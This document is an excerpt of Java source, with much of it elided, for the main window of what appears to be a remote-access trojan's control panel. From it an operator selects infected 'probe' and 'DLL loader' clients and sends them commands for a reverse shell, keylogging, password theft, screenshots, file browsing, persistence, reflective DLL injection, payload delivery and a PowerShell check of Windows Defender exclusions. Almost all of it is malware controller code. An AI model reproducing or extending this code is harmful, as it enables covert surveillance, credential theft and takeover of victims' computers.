...
public class MainWindow {
	...
	public static void Log(String text)
	{
	 ...
	 static void UpdateTabTitles() {
		...
		int probesz = Clients.size();
		int loadersz = LoaderClients.size();
	...
	{
		String sz = String.valueOf(Clients.size() + LoaderClients.size() );
	...
	public static int ClientIndex(Socket sock)
	{
		...
		if(Clients.contains(sock))
		{
			...
			out =Clients.indexOf(sock);
		} else {
			// Reflective Probe
			out = LoaderClients.indexOf(sock);
		}
	...
	private void initialize() {
	    ...
	    shell.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					...
					rshell.CLIENTSOCKET = Clients.get(index); //
					rshell.interact.setText("Reverse Shell for Client ID : " + String.valueOf(index) + " @ " + UserPC.get(index) + " running " + OperatingSystem.get(index));
	    ...
	    execpayload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {	
				if(table.getSelectionModel().isSelectionEmpty()) {
					...
					int index = table.getSelectedRow();
					rfWindow.CLIENTSOCKET = Clients.get(index);
					rfWindow.infoLbl.setText("for Client ID " + String.valueOf(index) + " " +UserPC.get(index));
	    ...
	    unis.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				int index = table.getSelectedRow(); 
				SendData(Clients.get(index), "kill");
				ServerThread s = new ServerThread(Clients.get(index), "Probe Client"); s.clear();
	    ...
	    ss.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					...
					int index = table.getSelectedRow(); 
					SendData(Clients.get(index), "screenshot");
	    ...
	    filemgr.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					...
					// Get The Drives
					SendData(Clients.get(index), "drives");
					ServerThread.WaitForReply();
	    ...
	    shutdown.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					...
					int index = table.getSelectedRow(); 
					SendData(Clients.get(index), "poweroff");
					ServerThread.WaitForReply();
	    ...
	    restart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					...
					int index = table.getSelectedRow(); 
					SendData(Clients.get(index), "restart");
					ServerThread.WaitForReply();	
	    ...
	    persist.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					...
					ps.CLIENT_ID = index;
					ps.username = UserPC.get(index).replace(" ", "").split("/")[0];
					ps.setVisible(true);
				}
			}
		});
	    ...
	    openurl.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					...
					{
						SendData(Clients.get(index), "openurl="+url);
						ServerThread.WaitForReply();
	    ...
	    keylog.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					...
					int index = table.getSelectedRow(); 
					SendData(Clients.get(index), "kls");
					ServerThread.WaitForReply();
				}
			}
		});
	    ...
	    taskmgr.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					...
					int index = table.getSelectedRow(); 
					SendData(Clients.get(index), "taskls");
					ServerThread.WaitForReply();
	    ...
	    pwrecover.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					...
					int index = table.getSelectedRow(); 
					PwRecover.host = UserPC.get(index);
					SendData(Clients.get(index), "passcat");
					ServerThread.WaitForReply();
	    ...
	    probeClient.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(loaderTable.getSelectionModel().isSelectionEmpty()) {
					...
					Socket CLIENTSOCKET = LoaderClients.get(index);
					...
					{						
						...
						SendData(LoaderClients.get(index), "kill");
						ServerThread s = new ServerThread(LoaderClients.get(index), "DLL Loader"); s.clear();
	    ...
	    discon.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				int index = loaderTable.getSelectedRow(); 
				SendData(LoaderClients.get(index), "kill");
				ServerThread s = new ServerThread(LoaderClients.get(index), "DLL Loader Client"); s.clear();
				Log("Connection Closed for Client ID : " + String.valueOf(index));
			}
	    ...
	    customDLL.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(loaderTable.getSelectionModel().isSelectionEmpty()) {
					...
					rfWindow.CLIENTSOCKET = LoaderClients.get(index);
					rfWindow.infoLbl.setText("for Loader ID " + String.valueOf(index) + " " +UserPC.get(index));
					ReflectiveDLLInjection.s.setText("");
					rfWindow.setVisible(true);
				}
			}
	    ...
	    loaderMG.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(loaderTable.getSelectionModel().isSelectionEmpty()) {
					...
					int index = loaderTable.getSelectedRow(); 
					SendData(LoaderClients.get(index), "taskls");
					ServerThread.WaitForReply();
	    ...
	    Loadershell.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(loaderTable.getSelectionModel().isSelectionEmpty()) {
					...
					Shell rshell = new Shell();
					int index = loaderTable.getSelectedRow();
					rshell.CLIENTSOCKET = LoaderClients.get(index); //
					rshell.interact.setText("Reverse Shell for Loader ID : " + String.valueOf(index) + " @ " +UserPC.get(index) + " running " + OperatingSystem.get(index));
					...
					if(n == JOptionPane.NO_OPTION)
					{
						...
						if(fdname.length() > 0)
						{
							...
							if(UACValue.equals("TRUE"))
							{
								...
								rshell.interact.setText("Sending Payload in Reverse Shell on Loader ID : " + String.valueOf(index) + " @ " + UserPC.get(index) + " running " + OperatingSystem.get(index));
								Log("Accessing Reverse Shell for Loader ID : " + String.valueOf(index));
								rshell.setVisible(true);	
								//x.ShellInput.setEditable(false);
								
								String userName = UserPC.get(index).replace(" ", "").split("/")[0];
								...
								//rshell.ShellGo.doClick();
								SendData(CLIENTSOCKET, checkPayload);
								//ServerThread.WaitForReply();
								rshell.dispose();
								HaltAllSystems();
								try {
	    ...
	    WinList.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(loaderTable.getSelectionModel().isSelectionEmpty()) {
					...
					rshell.CLIENTSOCKET = CLIENTSOCKET;
					rshell.interact.setText("Checking Windows Defender Exclusions on : " + String.valueOf(index) + " @ " + UserPC.get(index) + " running " + OperatingSystem.get(index));
					Log("Accessing Reverse Shell for Loader ID : " + String.valueOf(index));
					rshell.setVisible(true);	
					String checkPayload = "cmd.exe /c powershell.exe -c " +  '"' + "Get-MpPreference | Select-Object -Property ExclusionPath" + '"';
					rshell.ShellInput.setText(checkPayload);
